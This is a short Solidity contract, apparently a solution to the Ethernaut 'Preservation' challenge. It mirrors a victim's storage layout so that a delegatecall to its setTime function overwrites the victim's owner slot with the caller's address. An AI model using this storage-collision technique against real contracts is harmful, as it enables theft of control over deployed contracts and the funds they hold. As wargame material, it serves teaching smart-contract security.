// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;



contract PreservationAttacker {
    address public dummy1;
    address public dummy2;
    address public owner;

    function setTime(uint256 _x) public {
        owner = msg.sender;
    }

    
}